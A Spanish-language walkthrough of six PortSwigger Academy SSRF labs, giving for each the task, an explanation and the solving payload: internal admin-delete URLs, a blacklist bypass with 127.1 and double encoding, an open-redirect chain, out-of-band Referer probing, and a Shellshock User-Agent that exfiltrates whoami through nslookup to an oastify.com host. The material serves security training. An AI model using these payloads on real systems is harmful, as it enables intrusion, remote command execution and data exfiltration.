## Reto 1: SSRF básico contra el servidor local

Este laboratorio tiene una función de verificación de existencias que obtiene datos de un sistema interno.

Para resolver el laboratorio, cambie la URL de verificación de existencias para acceder a la interfaz de administración en http://localhost/adminy eliminar el usuario carlos.

Explotamos una vulnerabilidad SSRF en la funcionalidad de stock. Ya demostramos que era posible acceder al panel de administración interno, y ahora profundizamos en cómo automatizar la interacción con rutas internas específicas.

El objetivo en esta parte es enviar una solicitud manipulada desde el parámetro vulnerable para ejecutar una acción concreta: eliminar al usuario carlos desde el panel de administración. Esto demuestra cómo un SSRF básico puede escalar rápidamente en impacto si se accede a funciones internas críticas del servidor.

```
stockApi=http://localhost/admin/delete?username=carlos
```

## Reto 2: SSRF básico contra otro sistema back-end

Este laboratorio tiene una función de verificación de existencias que obtiene datos de un sistema interno.

Para resolver el laboratorio, utilice la función de verificación de existencias para escanear el interior 192.168.0.X rango para una interfaz de administrador en el puerto 8080, luego úsalo para eliminar al usuario carlos. 

Aprovechamos la funcionalidad de verificación de stock para lanzar un escaneo controlado dentro del rango 192.168.0.X, variando la última parte de la IP.

Una vez identificamos qué IP responde en el puerto 8080 con una interfaz de administración accesible, manipulamos el parámetro vulnerable para interactuar con ella y ejecutar una petición que elimina al usuario carlos.


```
stockApi=http://192.168.0.80:8080/admin/delete?username=carlos
```

## Reto 3: SSRF ciega con detección fuera de banda

Este sitio utiliza un software de análisis que obtiene la URL especificada en el encabezado Referer cuando se carga una página de producto.

Para resolver el laboratorio, utilice esta funcionalidad para generar una solicitud HTTP al servidor público Burp Collaborator. 

En esta clase continuamos con el estudio de ataques SSRF, pero en este caso nos enfrentamos a una variante ciega donde no obtenemos respuesta directa de la interacción. Aprovechamos una funcionalidad del sistema que realiza peticiones basadas en el valor del encabezado Referer, utilizado por un software de analítica interna.

Manipulamos este encabezado para incluir un dominio generado por Burp Collaborator, lo que permite detectar si el servidor realiza una solicitud saliente hacia dicho dominio. Aunque no veamos resultados en la respuesta de la aplicación, los logs de Burp Collaborator nos confirman que se ha producido una interacción, validando así la existencia de la vulnerabilidad. 

```html
Referer: https://e3in67nfsxrvz0qy88nx5ojwonuei56u.oastify.com
```

## Reto 4: SSRF con filtro de entrada basado en lista negra

Este laboratorio tiene una función de verificación de existencias que obtiene datos de un sistema interno.

Para resolver el laboratorio, cambie la URL de verificación de existencias para acceder a la interfaz de administración en http://localhost/admin y eliminar el usuario carlos.

El desarrollador ha implementado dos defensas anti-SSRF débiles que deberás evitar. 

centrándonos en cómo evadir defensas basadas en listas negras. La aplicación impide directamente ciertas direcciones como 127.0.0.1 y rutas sensibles como /admin, pero estas restricciones son débiles.

Utilizamos técnicas de evasión como redirecciones a direcciones IP alternativas (por ejemplo, 127.1) y codificación doble de caracteres (%2561 en lugar de a) para engañar al filtro.

```
stockApi=http://127.0.1/%2561dmin/delete?username=carlos
```

## Reto 5:SSRF con omisión de filtro mediante vulnerabilidad de redirección abierta

Este laboratorio tiene una función de verificación de existencias que obtiene datos de un sistema interno.

Para resolver el laboratorio, cambie la URL de verificación de existencias para acceder a la interfaz de administración en http://192.168.0.12:8080/adminy eliminar el usuario carlos.

El verificador de acciones se ha restringido para acceder únicamente a la aplicación local, por lo que primero deberá encontrar una redirección abierta que afecte a la aplicación. 

onde el stock checker sólo permite acceder a rutas internas de la propia aplicación, bloqueando directamente URLs externas. Sin embargo, identificamos una vulnerabilidad de redirección abierta en el parámetro path del endpoint ‘nextProduct’.

Aprovechamos esta redirección para hacer que el stock checker acceda de forma indirecta al panel de administración interno ubicado en http://192.168.0.12:8080/admin. Desde ahí, utilizamos la misma técnica para construir una URL que elimine al usuario carlos, completando así el laboratorio.

```
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```

## Reto 6: SSRF ciego con explotación de Shellshock

Este sitio utiliza un software de análisis que obtiene la URL especificada en el encabezado Referer cuando se carga una página de producto.

Para resolver el laboratorio, use esta funcionalidad para realizar un ataque SSRF ciego contra un servidor interno en el 192.168.0.X rango en el puerto 8080. En el ataque ciego, utilice una carga útil Shellshock contra el servidor interno para exfiltrar el nombre del usuario del sistema operativo. 

En este laboratorio donde el SSRF se combina con la vulnerabilidad Shellshock para ejecutar comandos remotos en un sistema interno. Aprovechamos el hecho de que la aplicación realiza peticiones HTTP a la URL indicada en el header Referer, y que estas peticiones incluyen la cabecera User-Agent, la cual podemos manipular.

Empleamos Burp Collaborator para generar un payload que, al ser ejecutado, filtra el nombre del usuario del sistema mediante una consulta DNS. Este payload es inyectado en el User-Agent usando la sintaxis de Shellshock, y el ataque se lanza desde Burp Intruder variando la IP interna objetivo (192.168.0.X) en el Referer.

Al finalizar, revisamos las interacciones en el Collaborator y recuperamos el nombre del usuario directamente desde el subdominio que llega en la consulta DNS.

```html
GET /product?productId=1 HTTP/2

Host: 0a49008d04099b2982c5c97c004e0047.web-security-academy.net

Cookie: session=8tVbTH6uMIzo42lUDPYTZGa1GhPOgaHh

Sec-Ch-Ua: 

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: ""

Upgrade-Insecure-Requests: 1

User-Agent: () { :; }; /usr/bin/nslookup $(whoami).222b5vm3rlqjyopm7wml4ciknbt2h05p.oastify.com

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: http://192.168.0.§X§:8080

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9
```




